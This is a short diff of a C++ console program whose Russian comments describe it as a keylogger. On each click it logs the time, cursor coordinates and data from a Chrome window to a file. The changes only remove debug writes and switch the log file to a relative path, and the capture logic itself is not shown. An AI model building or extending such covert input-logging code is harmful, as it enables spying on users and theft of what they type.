@@ -1,4 +1,4 @@
-// ConsoleApplication5.cpp: определяет точку входа для консольного приложения.
+﻿// ConsoleApplication5.cpp: определяет точку входа для консольного приложения.
 // кейлогер , который при клике пишет в файл время, координаты клика и данные из окна chrome
 
 #include "stdafx.h"
@@ -50,7 +50,6 @@ void keylogger(ofstream &file)
 	/* 
 	 * кейлоггер 
 	 */
-	file << "2323232";
 	tm* ptr;
 	time_t seconds;
 	int i;
@@ -84,11 +83,9 @@ void keylogger(ofstream &file)
 int main()
 {
 	setlocale(LC_ALL, "rus");
-	ofstream log_file("D:\\Desktop\\1.txt", std::ios_base::app);
+	ofstream log_file("1.txt", std::ios_base::app);		// на дозапись
 	while (!log_file.is_open())
-		ofstream log_file("D:\\Desktop\\1.txt");
-	log_file << "start\n";
-	log_file << "start2\n";
+		ofstream log_file("1.txt");
 	keylogger(log_file);
 	log_file.close();
 	return 0;
